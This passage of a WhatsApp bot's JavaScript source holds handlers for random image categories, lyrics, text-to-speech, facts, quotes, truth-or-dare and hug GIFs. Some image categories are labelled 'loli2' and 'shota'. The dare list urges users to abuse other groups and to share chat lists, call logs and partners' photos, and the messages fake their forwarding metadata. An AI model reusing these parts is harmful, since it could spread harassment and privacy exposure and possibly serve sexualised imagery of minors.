if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: yeha}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'lyrics': {
if (!text) return newReply(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
await hana()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const Lorenzolirik = `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: Lorenzolirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pick': {
            	if (!m.isGroup) return LorenzoStickGroup()
            	if (!text) return newReply(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await ToxxicTechInc.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let Lorenzoshimts = member[Math.floor(Math.random() * member.length)]
             let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `The most *${text}* here is *@${Lorenzoshimts.split("@")[0]}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [Lorenzoshimts], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
             
         }
     break
     case 'say': case 'tts': case 'gtts':{
if (!text) return newReply('Where is the text?')
            let texttts = text
            const Lorenzorl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return ToxxicTechInc.sendMessage(m.chat, {
                audio: {
                    url: Lorenzorl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} *Fact:* ${data.fact}\n`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
    }
    break
    case 'quotes':{
const quoteLorenzoy = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteLorenzoy.data.quote.body}\n\n*${themeemoji} Author:* ${quoteLorenzoy.data.quote.author}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: textquotes
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'truth': case 'dare': {
	bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease Choose The Button Below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Truth 🌝\",\"id\":\"${prefix}turut"}`
            },
{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Dare 🌚\",\"id\":\"${prefix}dere"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'dere':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner ToxxicTechInc through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const Lorenzodare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n'+ Lorenzodare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}dare"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
              break
                            break
       case 'turut':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, ToxxicTechInc?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const Lorenzotruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n'+ Lorenzotruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}truth"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
              break
              case 'hug': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

